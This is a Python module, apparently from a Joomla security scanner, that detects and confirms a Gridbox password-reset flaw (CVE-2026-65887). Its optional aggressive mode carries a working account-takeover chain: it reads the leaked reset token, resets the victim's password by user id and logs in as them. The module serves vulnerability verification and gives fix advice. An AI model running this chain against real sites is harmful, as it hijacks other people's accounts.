from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-65887"
NAME = "Gridbox password reset resets any account and leaks the token"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.1"
FIXED_RULE = "Gridbox 2.20.2 or later"
REMIND_PATH = "/index.php?option=com_gridbox&task=account.remindPassword"
REQUEST_PATH = "/index.php?option=com_gridbox&task=account.requestPassword"
RESET_PATH = "/index.php?option=com_gridbox&task=account.resetPassword"


def _post(client: HttpClient, url: str, fields: dict[str, str], timeout: int) -> dict[str, Any]:
    return client.request(
        url, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(fields), timeout=timeout, follow_redirects=False,
    )


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    victim_user: str | None = None,
    victim_email: str | None = None,
    victim_password: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    if not victim_user or not victim_email:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{REMIND_PATH}",
            detail=(
                "The probe needs a non-super lab account via --aggressive-arg "
                "victim_user=... victim_email=...; nothing was sent."
            ),
            action="Re-run with a lab victim account on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )

    remind = _post(client, f"{base}{REMIND_PATH}", {"email": victim_email}, timeout)
    remind_body = gb.json_body(remind)
    reset_token = remind_body.get("message")
    leaked = isinstance(reset_token, str) and len(reset_token) >= 16
    request = _post(
        client, f"{base}{REQUEST_PATH}",
        {"username": victim_user, "code": reset_token or ""}, timeout,
    )
    user_id = gb.json_body(request).get("id")
    new_password = gb.random_password()
    reset = _post(
        client, f"{base}{RESET_PATH}",
        {"id": str(user_id or ""), "password1": new_password, "password2": new_password}, timeout,
    )
    login_client = HttpClient(timeout=timeout, proxy=proxy)
    logged_in = gb.frontend_login(login_client, base, victim_user, new_password, timeout)
    identity = gb.profile_identity(login_client, base, timeout) if logged_in else None
    if victim_password and user_id:
        _post(
            client, f"{base}{RESET_PATH}",
            {"id": str(user_id), "password1": victim_password, "password2": victim_password}, timeout,
        )
    evidence: dict[str, object] = {
        "victim_user": victim_user,
        "reset_token_leaked": leaked,
        "resolved_user_id": user_id,
        "reset_status": reset.get("status"),
        "login_as_victim": identity == victim_user,
        "password_restored": bool(victim_password),
    }
    if leaked and identity == victim_user:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{RESET_PATH}",
            evidence=evidence,
            detail=(
                f"remindPassword returned the reset token in its JSON response, requestPassword resolved "
                f"{victim_user} to id {user_id}, and resetPassword changed the password using only that id. "
                "The probe then logged in as the victim without knowing the old password."
            ),
            action=(
                "Upgrade Gridbox to 2.20.2 or later, invalidate reset tokens, and rotate credentials "
                "for accounts that may have been reset."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{RESET_PATH}",
        evidence=evidence,
        detail=(
            "The reset chain did not complete "
            f"(token_leaked={leaked}, user_id={user_id}, login={identity!r})."
        ),
        action="Verify Gridbox runs 2.20.2 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.2",
        affected_detail="Gridbox is in the affected range; verify the reset chain against a lab account.",
        patched_detail="Gridbox requires a valid reset code and no longer returns the token.",
        action="Upgrade Gridbox to 2.20.2 or later and rotate credentials.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only password-reset proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        victim_user=args.get("victim_user"),
        victim_email=args.get("victim_email"),
        victim_password=args.get("victim_password"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-65887",
            "https://mysites.guru/blog/gridbox-23-critical-vulnerabilities/",
        ],
    }
